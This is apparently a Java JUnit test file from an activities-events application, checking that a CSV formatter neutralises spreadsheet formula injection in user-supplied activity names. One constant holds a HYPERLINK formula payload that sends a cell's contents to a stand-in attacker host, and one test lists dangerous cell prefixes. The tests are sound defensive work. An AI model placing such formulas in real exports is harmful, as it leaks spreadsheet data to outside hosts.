package com.smxplore.activitiesevents.application.indicator;

import com.smxplore.activitiesevents.domain.model.indicator.ActivityDemand;
import com.smxplore.activitiesevents.domain.model.indicator.DemandComparison;
import com.smxplore.activitiesevents.domain.model.indicator.DemandGranularity;
import com.smxplore.activitiesevents.domain.model.indicator.DemandIndicators;
import com.smxplore.activitiesevents.domain.model.indicator.DemandSummary;
import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.time.Instant;
import java.util.List;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * El CSV lo abren gestoras y administradores en Excel o LibreOffice. Los nombres del catalogo los
 * escriben usuarios, asi que una celda que empiece por {@code =}, {@code +}, {@code -} o {@code @}
 * se ejecutaria como formula al abrir el informe. Estos tests fijan la neutralizacion.
 */
class DemandCsvFormatterTest {

    private static final String FORMULA = "=HYPERLINK(\"https://atacante.example/x?d=\"&A1,\"Ver\")";

    @Test
    void neutralizesActivityNamesThatLookLikeFormulas() {
        var csv = DemandCsvFormatter.format(indicatorsWithActivity(FORMULA));

        assertThat(csv).contains("'=HYPERLINK");
        assertThat(csv).doesNotContain(",=HYPERLINK");
    }

    @Test
    void neutralizesEveryDangerousPrefix() {
        for (String prefix : List.of("=", "+", "-", "@", "\t", "\r")) {
            var csv = DemandCsvFormatter.format(indicatorsWithActivity(prefix + "SUM(A1:A2)"));
            assertThat(csv)
                    .describedAs("prefix [%s]", prefix)
                    .contains("'" + prefix + "SUM(A1:A2)");
        }
    }

    @Test
    void keepsOrdinaryNamesUntouched() {
        var csv = DemandCsvFormatter.format(indicatorsWithActivity("Kayak al atardecer"));

        assertThat(csv).contains("Kayak al atardecer");
        assertThat(csv).doesNotContain("'Kayak");
    }

    private static DemandIndicators indicatorsWithActivity(String name) {
        var activity = new ActivityDemand(UUID.randomUUID(), name, "Nautica", UUID.randomUUID(),
                "Bahia", UUID.randomUUID(), "Centro", UUID.randomUUID(), 3L, 6L,
                new BigDecimal("90000.00"), 0.5d, 10L, 0.6d);
        var summary = new DemandSummary(3L, 6L, new BigDecimal("90000.00"), 0L, 0L, 2L, 0.0d, 2.0d);
        var comparison = new DemandComparison(summary, summary, 0.0d, 0.0d, 0.0d, 0.0d);
        return new DemandIndicators(
                Instant.parse("2026-11-01T00:00:00Z"),
                Instant.parse("2026-11-08T00:00:00Z"),
                DemandGranularity.DAY,
                "America/Bogota",
                "Administrador",
                summary,
                comparison,
                List.of(),
                List.of(),
                List.of(),
                List.of(),
                List.of(),
                List.of(activity),
                List.of(),
                List.of(),
                false,
                Instant.parse("2026-11-08T00:00:00Z"));
    }
}
